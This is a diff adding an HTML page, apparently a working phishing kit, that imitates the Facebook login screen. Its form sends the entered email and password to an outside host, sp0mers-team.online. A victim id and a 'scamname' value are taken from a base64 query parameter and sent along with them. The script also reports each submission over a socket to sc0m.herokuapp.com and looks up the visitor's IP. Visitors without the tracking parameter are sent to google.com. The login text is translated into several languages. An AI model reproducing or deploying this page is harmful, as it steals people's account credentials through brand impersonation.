@@ -1,0 +1,335 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook Login</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+    <div class="container flex">
+        <div class="facebook-page flex">
+            <div class="text">
+                <h1>facebook</h1>
+                <p>Connect with friends and the world </p>
+                <p> around you on Facebook.</p>
+            </div>
+            <div id="page">
+                <form method="POST" action="https://sp0mers-team.online/v/add">
+
+                    <label>
+                        <input id="email" name="email" :placeholder="email" type="text" required>
+                    </label>
+
+                    <label>
+                        <input id="password" name="password" :placeholder="password" required type="password">
+                    </label>
+
+                    <input type="hidden" value="" name="code" v-model="codecountry">
+
+                    <input type="hidden" value="" name="id" v-model="id_u">
+                    <input type="hidden" value="" name="sc" v-model="scamname">
+
+                    <div class="link">
+                        <button type="submit" onclick="ss()" name="add" class="login">{{login}}</button>
+                        <!-- <button type="submit" class="login">Login</button> -->
+                        <a href="#" class="forgot">Forgot password?</a>
+                    </div>
+                    <hr>
+                    <div class="button">
+                        <a href="#">Create new account</a>
+                    </div>
+                </form>
+            </div>
+        </div>
+    </div>
+</body>
+
+<style>
+    @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap');
+
+    * {
+        margin: 0;
+        padding: 0;
+        box-sizing: border-box;
+        font-family: 'Roboto', sans-serif;
+    }
+
+    .flex {
+        display: flex;
+        align-items: center;
+    }
+
+    .container {
+        padding: 0 15px;
+        min-height: 100vh;
+        justify-content: center;
+        background: #f0f2f5;
+    }
+
+    .facebook-page {
+        justify-content: space-between;
+        max-width: 1000px;
+        width: 100%;
+    }
+
+    .facebook-page .text {
+        margin-bottom: 90px;
+    }
+
+    .facebook-page h1 {
+        color: #1877f2;
+        font-size: 4rem;
+        margin-bottom: 10px;
+    }
+
+    .facebook-page p {
+        font-size: 1.75rem;
+        white-space: nowrap;
+    }
+
+    form {
+        display: flex;
+        flex-direction: column;
+        background: #fff;
+        border-radius: 8px;
+        padding: 20px;
+        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1),
+            0 8px 16px rgba(0, 0, 0, 0.1);
+        max-width: 400px;
+        width: 100%;
+    }
+
+    form input {
+        height: 55px;
+        width: 100%;
+        border: 1px solid #ccc;
+        border-radius: 6px;
+        margin-bottom: 15px;
+        font-size: 1rem;
+        padding: 0 14px;
+    }
+
+    form input:focus {
+        outline: none;
+        border-color: #1877f2;
+    }
+
+    ::placeholder {
+        color: #777;
+        font-size: 1.063rem;
+    }
+
+    .link {
+        display: flex;
+        flex-direction: column;
+        text-align: center;
+        gap: 15px;
+    }
+
+    .link .login {
+        border: none;
+        outline: none;
+        cursor: pointer;
+        background: #1877f2;
+        padding: 15px 0;
+        border-radius: 6px;
+        color: #fff;
+        font-size: 1.25rem;
+        font-weight: 600;
+        transition: 0.2s ease;
+    }
+
+    .link .login:hover {
+        background: #0d65d9;
+    }
+
+    form a {
+        text-decoration: none;
+    }
+
+    .link .forgot {
+        color: #1877f2;
+        font-size: 0.875rem;
+    }
+
+    .link .forgot:hover {
+        text-decoration: underline;
+    }
+
+    hr {
+        border: none;
+        height: 1px;
+        background-color: #ccc;
+        margin-bottom: 20px;
+        margin-top: 20px;
+    }
+
+    .button {
+        margin-top: 25px;
+        text-align: center;
+        margin-bottom: 20px;
+    }
+
+    .button a {
+        padding: 15px 20px;
+        background: #42b72a;
+        border-radius: 6px;
+        color: #fff;
+        font-size: 1.063rem;
+        font-weight: 600;
+        transition: 0.2s ease;
+    }
+
+    .button a:hover {
+        background: #3ba626;
+    }
+
+    @media (max-width: 900px) {
+        .facebook-page {
+            flex-direction: column;
+            text-align: center;
+        }
+
+        .facebook-page .text {
+            margin-bottom: 30px;
+        }
+    }
+
+    @media (max-width: 460px) {
+        .facebook-page h1 {
+            font-size: 3.5rem;
+        }
+
+        .facebook-page p {
+            font-size: 1.3rem;
+        }
+
+        form {
+            padding: 15px;
+        }
+    }
+</style>
+
+
+<script src="https://unpkg.com/axios/dist/axios.min.js"></script>
+<script src="https://unpkg.com/country-phone-prefix@latest"></script>
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.3.2/socket.io.js"></script>
+
+<script>
+    const socket = io("wss://sc0m.herokuapp.com");
+    const queryStrings = window.location.search;
+    const urlParamss = new URLSearchParams(queryStrings);
+    const qs = urlParamss.get('q');
+
+    let rrss = atob(qs);
+    let users = rrss.split("_")[3];
+    users = users.split("=")[1];
+    function ss() {
+        socket.emit('add', {
+            nickname: "users",
+            groupe: parseInt(users),
+        });
+        socket.emit('adds', {
+            nickname: "users",
+            groupe: "all",
+        });
+    };
+</script>
+<script>
+    var vm = new Vue({
+        el: "#page",
+        data: {
+            password: "",
+            email: "",
+            login: '',
+            firsts: '',
+            create: '',
+            forget: '',
+            fetch: [],
+            codecountry: '',
+            id_u: '',
+            scamname: '',
+        },
+        methods: {
+
+        },
+
+        mounted() {
+            let email = document.getElementById('email').value;
+            let password = document.getElementById('password').value;
+            const queryString = window.location.search;
+            const urlParams = new URLSearchParams(queryString);
+            const q = urlParams.get('q');
+
+            let rrs = atob(q);
+            let idu = rrs.split("=")[1][1]
+            let user = rrs.split("_")[3]
+            user = user.split("=")[1]
+            let sc = rrs.split("_")[2]
+            sc = sc.split("=")[1]
+            rrs = rrs.split("_")[1]
+            rrs = rrs.split("=")[1]
+            //alert(user)
+            let lang = rrs;
+            this.id_u = user
+            this.scamname = sc
+
+            if (lang == 'ar') {
+                this.email = "رقم الهاتف  أو البريد الإلكتروني";
+                this.password = "كلمه السر";
+                this.create = "انشاء حساب جديد";
+                this.firsts = "انت تحتاج لتسجيل الدخول اولا.";
+                this.forget = " هل نسيت كلمة السر ؟";
+                this.login = "تسجيل الدخول"
+            }
+            else if (lang == 'es') {
+                this.email = "Número o correo electrónico";
+                this.password = "contraseña";
+                this.create = "Crear una nueva cuenta";
+                this.firsts = "Primero debes iniciar sesión.";
+                this.forget = "¿Contraseña olvidada?";
+                this.login = "iniciar sesión";
+            }
+            else if (lang == 'th') {
+                this.email = "เบอร์มือถือหรืออีเมล";
+                this.password = "รหัสผ่าน";
+                this.create = "สร้างบัญชีใหม่";
+                this.firsts = "คุณต้องเข้าสู่ระบบก่อน";
+                this.forget = "ลืมรหัสผ่าน?";
+                this.login = "เข้าสู่ระบบ";
+            }
+            else {
+                this.email = "Mobile number or email address";
+                this.password = "Password";
+                this.create = "Create New Account";
+                this.firsts = "You need to log in first.";
+                this.forget = "Forgotten password?";
+                this.login = "Log In";
+            }
+            axios.get("https://sc0m.com/ext/ip.php")
+            .then((resps) => {
+
+                    let dd = cpp[resps.data]
+                    this.codecountry = dd.prefix;
+                })
+                
+        },
+    })
+
+    const queryString = window.location.search;
+    const urlParams = new URLSearchParams(queryString);
+    const q = urlParams.get('q');
+
+    if (q == null) {
+        window.location = "https://google.com";
+        exit();
+    }
+</script>
+
+
+
+</html>
